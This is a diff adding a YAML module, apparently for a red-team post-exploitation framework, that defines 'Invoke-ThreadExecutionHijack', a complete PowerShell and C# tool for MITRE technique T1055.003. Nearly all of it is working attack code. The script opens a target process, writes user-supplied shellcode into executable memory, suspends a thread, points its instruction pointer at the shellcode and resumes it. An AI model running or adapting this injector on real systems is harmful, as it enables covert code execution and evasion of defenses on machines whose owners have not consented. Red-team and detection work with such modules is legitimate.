@@ -1,0 +1,303 @@
+name: Invoke-ThreadExecutionHijack
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Performs thread execution hijacking (T1055.003) to inject and execute
+  shellcode within a target process. The technique suspends a thread in
+  the target process, allocates memory, writes shellcode, modifies the
+  thread context to redirect execution to the shellcode, and resumes
+  the thread.
+
+  Uses Win32 API calls via Add-Type: OpenProcess, VirtualAllocEx,
+  WriteProcessMemory, OpenThread, SuspendThread, GetThreadContext,
+  SetThreadContext, and ResumeThread. The instruction pointer (RIP on
+  x64) is redirected to the injected shellcode address.
+software: ''
+tactics: [TA0005, TA0004]
+techniques: [T1055.003]
+background: false
+output_extension:
+needs_admin: true
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: TargetProcess
+    description: >-
+      Name of the target process to inject into (e.g., notepad, explorer). See StartIfMissing
+      to control behavior when the process is not running.
+    required: true
+    value: 'notepad'
+  - name: ShellcodeBase64
+    description: >-
+      Base64-encoded shellcode to inject and execute. If empty, a PoC stub (xor eax,eax;
+      ret) is used. WARNING: the PoC stub will crash the hijacked thread (and may
+      take the target process with it) once the RET pops a garbage stack value --
+      supply real shellcode for anything beyond a smoke test.
+    required: false
+    value: ''
+  - name: StartIfMissing
+    description: Start the target process if not already running. Default True so
+      the module works out of the box; set False to abort when the target is missing.
+    required: true
+    value: 'True'
+    strict: true
+    suggested_values:
+      - 'True'
+      - 'False'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-ThreadExecutionHijack {
+      param(
+          [string]$TargetProcess = "notepad",
+          [string]$ShellcodeBase64,
+          [switch]$StartIfMissing
+      )
+
+      if (-not [Environment]::Is64BitProcess) {
+          "[!] Invoke-ThreadExecutionHijack requires 64-bit PowerShell (uses CONTEXT64 / RIP)."
+          return
+      }
+
+      $code = @"
+  using System;
+  using System.Runtime.InteropServices;
+
+  public class ThreadHijack
+  {
+      // Process access rights
+      public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
+      public const uint MEM_COMMIT = 0x1000;
+      public const uint MEM_RESERVE = 0x2000;
+      public const uint PAGE_EXECUTE_READWRITE = 0x40;
+      public const uint THREAD_ALL_ACCESS = 0x001F03FF;
+      public const uint CONTEXT_FULL = 0x10000B;
+
+      [DllImport("kernel32.dll", SetLastError = true)]
+      public static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, int dwPID);
+
+      [DllImport("kernel32.dll", SetLastError = true)]
+      public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
+          uint dwSize, uint flAllocType, uint flProtect);
+
+      [DllImport("kernel32.dll", SetLastError = true)]
+      public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+          byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+      [DllImport("kernel32.dll", SetLastError = true)]
+      public static extern IntPtr OpenThread(uint dwAccess, bool bInherit, uint dwTID);
+
+      [DllImport("kernel32.dll", SetLastError = true)]
+      public static extern uint SuspendThread(IntPtr hThread);
+
+      [DllImport("kernel32.dll", SetLastError = true)]
+      public static extern uint ResumeThread(IntPtr hThread);
+
+      [DllImport("kernel32.dll", SetLastError = true)]
+      public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
+
+      [DllImport("kernel32.dll", SetLastError = true)]
+      public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
+
+      [DllImport("kernel32.dll", SetLastError = true)]
+      public static extern bool CloseHandle(IntPtr hObject);
+
+      [StructLayout(LayoutKind.Sequential)]
+      public struct M128A
+      {
+          public ulong Low;
+          public long High;
+      }
+
+      [StructLayout(LayoutKind.Sequential, Pack = 16)]
+      public struct CONTEXT64
+      {
+          public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
+          public uint ContextFlags;
+          public uint MxCsr;
+          public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
+          public uint EFlags;
+          public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
+          public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
+          public ulong R8, R9, R10, R11, R12, R13, R14, R15;
+          public ulong Rip;
+          // XSAVE_FORMAT
+          [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
+          public byte[] FltSave;
+          [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
+          public M128A[] VectorRegister;
+          public ulong VectorControl;
+          public ulong DebugControl;
+          public ulong LastBranchToRip;
+          public ulong LastBranchFromRip;
+          public ulong LastExceptionToRip;
+          public ulong LastExceptionFromRip;
+      }
+  }
+  "@
+
+      # Find target process first -- no point loading the type or preparing
+      # shellcode if we're just going to abort.
+      $proc = Get-Process -Name $TargetProcess -ErrorAction SilentlyContinue | Select-Object -First 1
+      if (-not $proc) {
+          if ($StartIfMissing) {
+              "[*] Process '$TargetProcess' not found, attempting to start..."
+              $proc = Start-Process -FilePath $TargetProcess -PassThru -ErrorAction SilentlyContinue
+              if (-not $proc) {
+                  "[!] Failed to start process '$TargetProcess'"
+                  return
+              }
+              Start-Sleep -Seconds 1
+          } else {
+              "[!] Process '$TargetProcess' not found and StartIfMissing is False. Aborting."
+              return
+          }
+      }
+
+      $targetPid = $proc.Id
+      "[*] Target process: $TargetProcess (PID: $targetPid)"
+
+      if (-not ('ThreadHijack' -as [type])) {
+          Add-Type -TypeDefinition $code -Language CSharp
+      }
+
+      # Default shellcode: xor eax,eax; ret. This is a PoC stub only --
+      # after the RET pops a garbage stack value the hijacked thread will
+      # almost certainly crash (and may take the target process with it).
+      if ([string]::IsNullOrWhiteSpace($ShellcodeBase64)) {
+          $shellcode = [byte[]](0x31, 0xC0, 0xC3)
+          "[*] Using default PoC shellcode (xor eax,eax; ret) -- will crash the hijacked thread"
+      } else {
+          try {
+              $shellcode = [Convert]::FromBase64String($ShellcodeBase64)
+          } catch {
+              "[!] Invalid ShellcodeBase64: $_"
+              return
+          }
+          "[*] Using provided shellcode ($($shellcode.Length) bytes)"
+      }
+
+      $hProcess = [IntPtr]::Zero
+      $hThread = [IntPtr]::Zero
+      $remoteAddr = [IntPtr]::Zero
+      $threadSuspended = $false
+
+      try {
+          # Open the target process
+          $hProcess = [ThreadHijack]::OpenProcess([ThreadHijack]::PROCESS_ALL_ACCESS, $false, $targetPid)
+          if ($hProcess -eq [IntPtr]::Zero) {
+              "[!] Failed to open process (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+              return
+          }
+          "[+] Opened process handle: $hProcess"
+
+          # Allocate memory in the target process
+          $allocSize = [uint32]$shellcode.Length
+          $remoteAddr = [ThreadHijack]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $allocSize,
+              ([ThreadHijack]::MEM_COMMIT -bor [ThreadHijack]::MEM_RESERVE),
+              [ThreadHijack]::PAGE_EXECUTE_READWRITE)
+          if ($remoteAddr -eq [IntPtr]::Zero) {
+              "[!] VirtualAllocEx failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+              return
+          }
+          "[+] Allocated $allocSize bytes at: 0x$($remoteAddr.ToString('X'))"
+
+          # Write shellcode to the allocated memory
+          $bytesWritten = [IntPtr]::Zero
+          $writeResult = [ThreadHijack]::WriteProcessMemory($hProcess, $remoteAddr, $shellcode,
+              $allocSize, [ref]$bytesWritten)
+          if (-not $writeResult) {
+              "[!] WriteProcessMemory failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+              return
+          }
+          "[+] Wrote $($bytesWritten.ToInt64()) bytes of shellcode"
+
+          # Get the first thread of the target process
+          if ($proc.Threads.Count -eq 0) {
+              "[!] Target process has no threads (may have exited)"
+              return
+          }
+          $thread = $proc.Threads[0]
+          $threadId = [uint32]$thread.Id
+          "[*] Targeting thread ID: $threadId"
+
+          # Open the thread
+          $hThread = [ThreadHijack]::OpenThread([ThreadHijack]::THREAD_ALL_ACCESS, $false, $threadId)
+          if ($hThread -eq [IntPtr]::Zero) {
+              "[!] OpenThread failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+              return
+          }
+          "[+] Opened thread handle: $hThread"
+
+          # Suspend the thread
+          $suspendCount = [ThreadHijack]::SuspendThread($hThread)
+          if ($suspendCount -eq [uint32]::MaxValue) {
+              "[!] SuspendThread failed"
+              return
+          }
+          $threadSuspended = $true
+          "[+] Thread suspended (suspend count: $suspendCount)"
+
+          # Get thread context
+          $context = New-Object ThreadHijack+CONTEXT64
+          $context.ContextFlags = [ThreadHijack]::CONTEXT_FULL
+          $context.FltSave = New-Object byte[] 512
+          $context.VectorRegister = New-Object ThreadHijack+M128A[] 26
+
+          $getResult = [ThreadHijack]::GetThreadContext($hThread, [ref]$context)
+          if (-not $getResult) {
+              "[!] GetThreadContext failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+              return
+          }
+
+          $originalRip = $context.Rip
+          "[+] Original RIP: 0x$($originalRip.ToString('X'))"
+
+          # Set RIP to point to our shellcode
+          $context.Rip = [uint64]$remoteAddr.ToInt64()
+          "[*] Setting RIP to: 0x$($context.Rip.ToString('X'))"
+
+          $setResult = [ThreadHijack]::SetThreadContext($hThread, [ref]$context)
+          if (-not $setResult) {
+              "[!] SetThreadContext failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
+              # Restore original RIP before the finally block resumes the thread
+              $context.Rip = $originalRip
+              [ThreadHijack]::SetThreadContext($hThread, [ref]$context) | Out-Null
+              return
+          }
+          "[+] Thread context updated"
+
+          # Resume the thread (finally block will still run but $threadSuspended is cleared)
+          [ThreadHijack]::ResumeThread($hThread) | Out-Null
+          $threadSuspended = $false
+          "[+] Thread resumed - shellcode executing"
+
+          "[+] Thread execution hijacking complete"
+          "[*] Process: $TargetProcess (PID: $targetPid, TID: $threadId)"
+          "[*] Shellcode address: 0x$($remoteAddr.ToString('X'))"
+      } catch {
+          "[!] Unexpected exception during injection: $_"
+      } finally {
+          # Guarantee we never leave the target thread suspended or leak handles
+          if ($threadSuspended -and $hThread -ne [IntPtr]::Zero) {
+              [ThreadHijack]::ResumeThread($hThread) | Out-Null
+          }
+          if ($hThread -ne [IntPtr]::Zero) {
+              [ThreadHijack]::CloseHandle($hThread) | Out-Null
+          }
+          if ($hProcess -ne [IntPtr]::Zero) {
+              [ThreadHijack]::CloseHandle($hProcess) | Out-Null
+          }
+      }
+  }
+script_end: Invoke-ThreadExecutionHijack {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
